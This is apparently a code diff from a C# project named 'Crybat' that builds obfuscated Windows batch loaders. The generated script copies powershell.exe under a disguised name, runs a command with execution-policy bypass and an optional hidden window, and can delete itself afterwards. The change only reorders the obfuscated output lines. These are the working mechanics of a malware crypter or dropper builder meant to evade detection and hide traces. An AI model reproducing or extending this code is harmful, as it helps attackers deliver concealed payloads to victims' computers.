@@ -13,20 +13,21 @@ namespace Crybat
 
             (string, string) obfuscated = Obfuscator.GenCodeBat(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ", rng, 4);
             output.AppendLine(obfuscated.Item1);
-            output.AppendLine(obfuscated.Item2 + "\"%~dp0%~nx0.exe\"");
 
-            output.AppendLine("cls");
-            obfuscated = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
-            output.AppendLine(obfuscated.Item1);
-            output.AppendLine(obfuscated.Item2);
+            (string, string) obfuscated2 = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
+            output.AppendLine(obfuscated2.Item1);
 
             string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
-            obfuscated = Obfuscator.GenCodeBat(commandstart + command, rng, 3);
-            output.AppendLine(obfuscated.Item1);
-            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2);
+            (string, string) obfuscated3 = Obfuscator.GenCodeBat(commandstart + command, rng, 3);
+            output.AppendLine(obfuscated3.Item1);
+
+            output.AppendLine(obfuscated.Item2 + "\"%~dp0%~nx0.exe\"");
+            output.AppendLine("cls");
+            output.AppendLine(obfuscated2.Item2);
+            output.AppendLine("\"%~nx0.exe\" " + obfuscated3.Item2);
 
             if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
-            output.AppendLine("exit /b");
+            output.Append("exit /b");
             return output.ToString();
         }
     }
